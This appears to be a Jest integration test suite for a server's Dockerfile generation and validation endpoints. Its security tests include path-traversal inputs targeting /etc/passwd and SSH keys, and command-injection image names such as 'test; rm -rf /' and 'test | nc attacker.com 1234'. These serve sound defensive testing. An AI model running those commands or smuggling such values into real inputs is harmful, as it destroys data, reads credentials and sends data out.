/**
 * Docker Integration Test Suite
 * Story 1-4: Docker Integration
 * 
 * Tests Dockerfile generation and validation endpoints
 * Verifies all acceptance criteria for Story 1-4
 */

const { exec } = require('child_process');
const fs = require('fs').promises;
const path = require('path');
const http = require('http');
const { promisify } = require('util');

const execAsync = promisify(exec);

// Test configuration
const TEST_PORT = 3002; // Use different port to avoid conflicts
const TEST_WORKSPACE = path.join(__dirname, '../test-workspace');
const SERVER_PATH = path.join(__dirname, '../server.cjs');

// Helper to start test server
let serverProcess = null;
let serverReady = false;

async function startTestServer() {
    return new Promise((resolve, reject) => {
        const env = { ...process.env, PORT: TEST_PORT };
        serverProcess = exec(`node ${SERVER_PATH}`, { env }, (error) => {
            if (error && !serverReady) {
                reject(error);
            }
        });

        // Wait for server to be ready
        let attempts = 0;
        const checkReady = setInterval(() => {
            attempts++;
            const req = http.get(`http://localhost:${TEST_PORT}/health`, (res) => {
                if (res.statusCode === 200) {
                    serverReady = true;
                    clearInterval(checkReady);
                    resolve();
                }
            });
            req.on('error', () => {
                if (attempts > 30) {
                    clearInterval(checkReady);
                    reject(new Error('Server failed to start within 30 seconds'));
                }
            });
            req.end();
        }, 1000);
    });
}

async function stopTestServer() {
    if (serverProcess) {
        serverProcess.kill();
        serverProcess = null;
        serverReady = false;
    }
}

// Helper to make API requests using Node's http module
function apiRequest(endpoint, method = 'GET', body = null) {
    return new Promise((resolve, reject) => {
        const url = new URL(`http://localhost:${TEST_PORT}${endpoint}`);
        const options = {
            hostname: url.hostname,
            port: url.port,
            path: url.pathname,
            method: method,
            headers: {
                'Content-Type': 'application/json'
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });
            res.on('end', () => {
                try {
                    const parsed = data ? JSON.parse(data) : {};
                    resolve({ status: res.statusCode, data: parsed });
                } catch (err) {
                    resolve({ status: res.statusCode, data: data });
                }
            });
        });

        req.on('error', (err) => {
            reject(err);
        });

        if (body) {
            req.write(JSON.stringify(body));
        }
        req.end();
    });
}

// Setup and teardown
beforeAll(async () => {
    // Create test workspace
    try {
        await fs.mkdir(TEST_WORKSPACE, { recursive: true });
    } catch (err) {
        // Directory might already exist
    }
    await startTestServer();
}, 35000);

afterAll(async () => {
    await stopTestServer();
    // Cleanup test workspace
    try {
        await fs.rm(TEST_WORKSPACE, { recursive: true, force: true });
    } catch (err) {
        // Ignore cleanup errors
    }
});

afterEach(async () => {
    // Clean up generated Dockerfiles after each test
    try {
        const files = await fs.readdir(TEST_WORKSPACE);
        for (const file of files) {
            if (file === 'Dockerfile' || file.startsWith('Dockerfile.')) {
                await fs.unlink(path.join(TEST_WORKSPACE, file));
            }
        }
    } catch (err) {
        // Ignore cleanup errors
    }
});

describe('Story 1-4: Docker Integration', () => {
    describe('Task 1: Dockerfile Generation Endpoint (AC: 1)', () => {
        test('[P0] should verify /api/docker/generate endpoint exists and is functional', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs'
            });
            expect(response.status).not.toBe(404);
            expect(response.data).toHaveProperty('success');
        });

        test('[P0] should accept project configuration parameters', async () => {
            const config = {
                projectType: 'nodejs',
                outputPath: path.join(TEST_WORKSPACE, 'Dockerfile'),
                dependencies: { nodeVersion: '20-alpine' },
                buildCommand: 'npm run build',
                port: 3001,
                envVars: { NODE_ENV: 'production' }
            };
            const response = await apiRequest('/api/docker/generate', 'POST', config);
            expect(response.status).toBe(200);
            expect(response.data.success).toBe(true);
            expect(response.data).toHaveProperty('dockerfilePath');
            expect(response.data).toHaveProperty('content');
        });

        test('[P0] should generate valid Dockerfile for Node.js projects', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs',
                outputPath: path.join(TEST_WORKSPACE, 'Dockerfile.nodejs'),
                port: 3001
            });
            expect(response.status).toBe(200);
            expect(response.data.success).toBe(true);
            const content = response.data.content;
            expect(content).toContain('FROM node');
            expect(content).toContain('EXPOSE 3001');
            expect(content).toContain('HEALTHCHECK');
        });

        test('[P0] should generate valid Dockerfile for Python projects', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'python',
                outputPath: path.join(TEST_WORKSPACE, 'Dockerfile.python'),
                port: 8000
            });
            expect(response.status).toBe(200);
            expect(response.data.success).toBe(true);
            const content = response.data.content;
            expect(content).toContain('FROM python');
            expect(content).toContain('EXPOSE 8000');
            expect(content).toContain('HEALTHCHECK');
        });

        test('[P0] should generate valid Dockerfile for React/Vite projects', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'react',
                outputPath: path.join(TEST_WORKSPACE, 'Dockerfile.react'),
                port: 5173
            });
            expect(response.status).toBe(200);
            expect(response.data.success).toBe(true);
            const content = response.data.content;
            expect(content).toContain('FROM node');
            expect(content).toContain('FROM nginx:alpine');
            expect(content).toContain('EXPOSE 5173');
        });

        test('[P0] should generate Dockerfiles following Docker best practices', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs',
                outputPath: path.join(TEST_WORKSPACE, 'Dockerfile'),
                port: 3001
            });
            expect(response.status).toBe(200);
            const content = response.data.content;
            
            // Check for multi-stage build
            expect(content).toContain('AS builder');
            expect(content).toContain('FROM node');
            
            // Check for minimal base images (alpine)
            expect(content).toMatch(/node:.*alpine/);
            
            // Check for health check
            expect(content).toContain('HEALTHCHECK');
        });

        test('[P0] should handle unsupported project types with error', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'unsupported-type'
            });
            expect(response.status).toBe(400);
            expect(response.data.error).toContain('Unsupported project type');
        });

        test('[P0] should require projectType parameter', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {});
            expect(response.status).toBe(400);
            expect(response.data.error).toContain('projectType is required');
        });

        test('[P0] should write Dockerfile to specified location', async () => {
            const outputPath = path.join(TEST_WORKSPACE, 'custom-dockerfile');
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs',
                outputPath: outputPath
            });
            expect(response.status).toBe(200);
            expect(response.data.dockerfilePath).toBe(outputPath);
            
            // Verify file was written
            const fileContent = await fs.readFile(outputPath, 'utf-8');
            expect(fileContent).toContain('FROM node');
        });

        test('[P0] should write Dockerfile to project root if outputPath not specified', async () => {
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs'
            });
            expect(response.status).toBe(200);
            expect(response.data.dockerfilePath).toContain('Dockerfile');
        });
    });

    describe('Task 2: Dockerfile Validation Endpoint (AC: 2)', () => {
        let validDockerfilePath = null;

        beforeEach(async () => {
            // Create a valid Dockerfile for testing
            validDockerfilePath = path.join(TEST_WORKSPACE, 'test.Dockerfile');
            const dockerfileContent = `FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 3001
CMD ["node", "index.js"]`;
            await fs.writeFile(validDockerfilePath, dockerfileContent);
        });

        test('[P0] should verify /api/docker/validate endpoint exists and is functional', async () => {
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: validDockerfilePath
            });
            expect(response.status).not.toBe(404);
            expect(response.data).toHaveProperty('success');
        });

        test('[P0] should accept dockerfilePath, imageName, and cleanup parameters', async () => {
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: validDockerfilePath,
                imageName: 'test-image-123',
                cleanup: true
            });
            expect(response.status).toBe(200);
            expect(response.data).toHaveProperty('success');
            expect(response.data).toHaveProperty('imageTag');
        });

        test('[P0] should attempt to build Docker image using docker build', async () => {
            // This test requires Docker to be installed and running
            // Skip if Docker is not available
            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker build test - Docker not available');
                return;
            }

            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: validDockerfilePath,
                imageName: `test-build-${Date.now()}`
            });
            
            // Build might succeed or fail depending on context, but should attempt
            expect(response.status).toBe(200);
            expect(response.data).toHaveProperty('success');
            expect(response.data).toHaveProperty('stdout');
            expect(response.data).toHaveProperty('stderr');
        });

        test('[P0] should return build success/failure status', async () => {
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: validDockerfilePath,
                imageName: `test-status-${Date.now()}`
            });
            expect(response.status).toBe(200);
            expect(typeof response.data.success).toBe('boolean');
        });

        test('[P0] should return error messages for failed builds', async () => {
            // Create an invalid Dockerfile
            const invalidDockerfilePath = path.join(TEST_WORKSPACE, 'invalid.Dockerfile');
            await fs.writeFile(invalidDockerfilePath, 'INVALID DOCKERFILE CONTENT');

            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker build test - Docker not available');
                return;
            }

            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: invalidDockerfilePath,
                imageName: `test-error-${Date.now()}`
            });
            
            expect(response.status).toBe(200);
            if (!response.data.success) {
                expect(response.data.stderr || response.data.stdout).toBeTruthy();
            }
        });

        test('[P0] should handle missing Dockerfile with 404 error', async () => {
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: path.join(TEST_WORKSPACE, 'nonexistent.Dockerfile')
            });
            expect(response.status).toBe(404);
            expect(response.data.error).toContain('not found');
        });

        test('[P0] should handle invalid image names', async () => {
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: validDockerfilePath,
                imageName: 'a'.repeat(200) // Too long
            });
            expect(response.status).toBe(400);
            expect(response.data.error).toContain('Invalid image name');
        });
    });

    describe('Task 3: Build Process and Error Reporting (AC: 3)', () => {
        test('[P0] should capture and return build output (stdout/stderr)', async () => {
            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker build test - Docker not available');
                return;
            }

            const dockerfilePath = path.join(TEST_WORKSPACE, 'test.Dockerfile');
            await fs.writeFile(dockerfilePath, `FROM node:20-alpine
WORKDIR /app
EXPOSE 3001`);

            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: dockerfilePath,
                imageName: `test-output-${Date.now()}`
            });
            
            expect(response.status).toBe(200);
            expect(response.data).toHaveProperty('stdout');
            expect(response.data).toHaveProperty('stderr');
            expect(response.data).toHaveProperty('buildOutput');
        });

        test('[P0] should include specific error messages in build failures', async () => {
            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker build test - Docker not available');
                return;
            }

            const invalidDockerfilePath = path.join(TEST_WORKSPACE, 'error.Dockerfile');
            await fs.writeFile(invalidDockerfilePath, 'FROM invalid-image:tag\nRUN invalid-command');

            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: invalidDockerfilePath,
                imageName: `test-errors-${Date.now()}`
            });
            
            expect(response.status).toBe(200);
            if (!response.data.success) {
                expect(response.data.errors || response.data.stderr).toBeTruthy();
            }
        });

        test('[P0] should include line numbers in build failures via parseDockerErrors', async () => {
            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker build test - Docker not available');
                return;
            }

            const invalidDockerfilePath = path.join(TEST_WORKSPACE, 'line-error.Dockerfile');
            await fs.writeFile(invalidDockerfilePath, `FROM node:20-alpine
WORKDIR /app
RUN invalid-command-here`);

            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: invalidDockerfilePath,
                imageName: `test-lines-${Date.now()}`
            });
            
            expect(response.status).toBe(200);
            if (!response.data.success && response.data.errors) {
                // Check if errors array has line number information
                const hasLineInfo = response.data.errors.some(err => 
                    err.dockerfileLine !== null || err.line !== null
                );
                // Note: This might not always have line numbers depending on Docker output format
            }
        });

        test('[P0] should handle build timeout (10 minute timeout)', async () => {
            // This test would require a Dockerfile that takes >10 minutes to build
            // For now, we verify the timeout mechanism exists in the code
            // Actual timeout testing would require a very long build process
            const dockerfilePath = path.join(TEST_WORKSPACE, 'timeout.Dockerfile');
            await fs.writeFile(dockerfilePath, 'FROM node:20-alpine\nWORKDIR /app');
            
            // Just verify endpoint accepts the request
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: dockerfilePath,
                imageName: `test-timeout-${Date.now()}`
            });
            expect(response.status).toBe(200);
        });

        test('[P0] should execute build in workspace context (sandboxed via safePath)', async () => {
            // Test path traversal prevention
            const maliciousPath = path.join(TEST_WORKSPACE, '../../etc/passwd');
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: maliciousPath
            });
            
            // Should either return 404 (file doesn't exist) or reject path traversal
            expect([404, 500, 400]).toContain(response.status);
        });
    });

    describe('Task 4: Docker Operations Logging and Cleanup (AC: 4)', () => {
        test('[P0] should store Dockerfile in project root or specified location', async () => {
            const outputPath = path.join(TEST_WORKSPACE, 'stored.Dockerfile');
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs',
                outputPath: outputPath
            });
            
            expect(response.status).toBe(200);
            expect(response.data.dockerfilePath).toBe(outputPath);
            
            // Verify file exists
            const exists = await fs.access(outputPath).then(() => true).catch(() => false);
            expect(exists).toBe(true);
        });

        test('[P0] should log Docker operations (generate, validate, build)', async () => {
            // Logging is verified by checking server logs
            // In a real scenario, we would capture and verify log output
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs',
                outputPath: path.join(TEST_WORKSPACE, 'log-test.Dockerfile')
            });
            expect(response.status).toBe(200);
            // Logging happens server-side, so we verify the operation succeeded
        });

        test('[P0] should automatically cleanup temporary Docker images after validation', async () => {
            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker cleanup test - Docker not available');
                return;
            }

            const dockerfilePath = path.join(TEST_WORKSPACE, 'cleanup.Dockerfile');
            await fs.writeFile(dockerfilePath, `FROM node:20-alpine
WORKDIR /app
EXPOSE 3001`);

            const imageName = `test-cleanup-${Date.now()}`;
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: dockerfilePath,
                imageName: imageName,
                cleanup: true
            });
            
            expect(response.status).toBe(200);
            
            // Verify image was cleaned up (should not exist)
            try {
                const { stdout } = await execAsync(`docker images ${imageName} --format "{{.Repository}}"`);
                // If cleanup worked, image should not be listed
                expect(stdout.trim()).toBe('');
            } catch (err) {
                // Image not found is expected after cleanup
            }
        });

        test('[P0] should allow disabling cleanup via cleanup parameter', async () => {
            try {
                await execAsync('docker --version');
            } catch (err) {
                console.log('Skipping Docker cleanup test - Docker not available');
                return;
            }

            const dockerfilePath = path.join(TEST_WORKSPACE, 'no-cleanup.Dockerfile');
            await fs.writeFile(dockerfilePath, `FROM node:20-alpine
WORKDIR /app
EXPOSE 3001`);

            const imageName = `test-no-cleanup-${Date.now()}`;
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: dockerfilePath,
                imageName: imageName,
                cleanup: false
            });
            
            expect(response.status).toBe(200);
            // Note: We can't easily verify the image still exists without Docker API access
            // But we verify the parameter is accepted
        });

        test('[P0] should handle cleanup errors gracefully', async () => {
            // Test that cleanup doesn't fail if image doesn't exist
            const response = await apiRequest('/api/docker/validate', 'POST', {
                dockerfilePath: path.join(TEST_WORKSPACE, 'nonexistent.Dockerfile'),
                imageName: 'nonexistent-image',
                cleanup: true
            });
            
            // Should handle missing file gracefully
            expect([404, 500]).toContain(response.status);
        });
    });

    describe('Task 5: Comprehensive Testing and Security', () => {
        test('[P0] should prevent path traversal attacks via safePath', async () => {
            const maliciousPaths = [
                '../../../etc/passwd',
                '../../../../root/.ssh/id_rsa',
                '..\\..\\windows\\system32',
                '/etc/passwd',
                'C:\\Windows\\System32'
            ];

            for (const maliciousPath of maliciousPaths) {
                const response = await apiRequest('/api/docker/generate', 'POST', {
                    projectType: 'nodejs',
                    outputPath: maliciousPath
                });
                
                // Should either reject or sanitize the path
                expect([400, 500]).toContain(response.status);
            }
        });

        test('[P0] should prevent command injection in image names', async () => {
            const maliciousImageNames = [
                'test; rm -rf /',
                'test && cat /etc/passwd',
                'test | nc attacker.com 1234',
                'test`whoami`',
                'test$(id)'
            ];

            const dockerfilePath = path.join(TEST_WORKSPACE, 'injection.Dockerfile');
            await fs.writeFile(dockerfilePath, 'FROM node:20-alpine');

            for (const maliciousName of maliciousImageNames) {
                const response = await apiRequest('/api/docker/validate', 'POST', {
                    dockerfilePath: dockerfilePath,
                    imageName: maliciousName
                });
                
                // Image name should be sanitized or rejected
                if (response.status === 200) {
                    // If accepted, verify it was sanitized (no special chars in imageTag)
                    expect(response.data.imageTag).not.toMatch(/[;&|`$]/);
                } else {
                    // Or rejected entirely
                    expect([400, 500]).toContain(response.status);
                }
            }
        });

        test('[P0] should handle all project types correctly', async () => {
            const projectTypes = ['nodejs', 'node', 'python', 'react', 'vite'];
            
            for (const projectType of projectTypes) {
                const response = await apiRequest('/api/docker/generate', 'POST', {
                    projectType: projectType,
                    outputPath: path.join(TEST_WORKSPACE, `test-${projectType}.Dockerfile`)
                });
                
                expect(response.status).toBe(200);
                expect(response.data.success).toBe(true);
                expect(response.data.content).toBeTruthy();
            }
        });

        test('[P0] should handle edge cases gracefully', async () => {
            // Test with missing optional parameters
            const response = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs'
            });
            expect(response.status).toBe(200);
            
            // Test with empty strings
            const response2 = await apiRequest('/api/docker/generate', 'POST', {
                projectType: 'nodejs',
                buildCommand: '',
                port: null
            });
            expect(response2.status).toBe(200);
        });
    });
});

